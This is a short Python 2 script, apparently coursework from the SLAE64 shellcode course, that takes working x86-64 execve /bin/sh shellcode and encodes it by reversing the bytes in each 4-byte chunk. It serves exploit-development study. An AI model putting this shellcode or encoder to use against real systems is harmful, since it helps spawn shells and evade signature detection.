#execve stack shellcode value from SLAE64 course

#python ./encoder.py 
#Input:\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05
#Output\x50\xc0\x31\x48\x62\x2f\xbb\x48\x73\x2f\x6e\x69\x89\x48\x53\x68\x89\x48\x50\xe7\x89\x48\x57\xe2\xc0\x83\x48\xe6\x90\x05\x0f\x3b

#Encoder script takes the shellcode and "divides" it into 4 byte chunks where it then reverses the byte order [0][1][2][3]=>[3][2][1][0] in ever 4 byte chunk.

import binascii

j = 3
i = 0
shellcode = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
shellarray = bytearray(shellcode)
length = len(shellarray)
encoded = []

encoded_shellcode = shellcode.encode('hex')
input = "Input:"+ r"\x" + r"\x".join(encoded_shellcode[n:n+2] for n in range(0, len(encoded_shellcode),2))
print input

#print "Old length: %s" % length

if (length%4 != 0):
	adding = 4 -(length%4)
	for i in range (adding):
		shellarray.append(0x90)

#print "New length with \\x90-s appended: %s" % len(shellarray)

#changing positions
while(j <= len(shellarray)):
	for i in range(4):
		encoded.append(shellarray[j-i])
	j = j + 4

output = binascii.hexlify(bytearray(encoded))
result = "Output" + r"\x" + r"\x".join(output[n : n+2] for n in range(0, len(output), 2))
print result
